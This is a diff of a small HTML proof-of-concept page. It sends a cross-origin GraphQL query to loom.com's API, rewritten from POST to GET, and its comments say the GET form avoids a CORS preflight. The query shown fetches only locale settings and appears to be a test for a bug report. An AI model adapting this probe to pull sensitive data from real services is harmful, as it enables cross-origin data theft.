@@ -2,46 +2,42 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Loom GraphQL PoC</title>
+  <title>Loom GraphQL GET PoC</title>
 </head>
 <body>
-  <h1>Loom GraphQL PoC</h1>
-  <p>打开控制台查看返回的数据（无需登录）。</p>
+  <h1>Loom GraphQL GET PoC</h1>
+  <p>打开浏览器 Console，查看返回的 JSON 数据。</p>
   <script>
-    const payload = {
+    // 构造一个 GET 请求 URL，将所有参数都放在查询字符串里
+    const query = [
+      'query AtlassianLocaleResponse {',
+      '  atlassianLocaleResponse {',
+      '    localeRequiresMarketingOptIn',
+      '    locale',
+      '    __typename',
+      '  }',
+      '  __typename',
+      '}'
+    ].join(' ');
+    const params = new URLSearchParams({
       operationName: "AtlassianLocaleResponse",
-      variables: {},
-      query:
-        "query AtlassianLocaleResponse {\n" +
-        "  atlassianLocaleResponse {\n" +
-        "    ... on GetAtlassianLocalePayload {\n" +
-        "      localeRequiresMarketingOptIn\n" +
-        "      locale\n" +
-        "      __typename\n" +
-        "    }\n" +
-        "    __typename\n" +
-        "  }\n" +
-        "}"
-    };
-
-    fetch("https://www.loom.com/graphql", {
-      method: "POST",
-      mode: "cors",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify(payload)
-    })
-    .then(response => response.json())
-    .then(data => {
-      console.log("✅ PoC fetched:", data);
-      const pre = document.createElement("pre");
-      pre.textContent = JSON.stringify(data, null, 2);
-      document.body.appendChild(pre);
-    })
-    .catch(err => {
-      console.error("❌ PoC fetch failed:", err);
+      variables: "{}",          // 空对象
+      query: query
     });
+    const url = "https://www.loom.com/graphql?" + params.toString();
+
+    // GET 是简单请求，不会触发 CORS 预检
+    fetch(url)
+      .then(res => res.json())
+      .then(data => {
+        console.log("✅ GET PoC fetched:", data);
+        const pre = document.createElement("pre");
+        pre.textContent = JSON.stringify(data, null, 2);
+        document.body.appendChild(pre);
+      })
+      .catch(err => {
+        console.error("❌ PoC fetch failed:", err);
+      });
   </script>
 </body>
 </html>
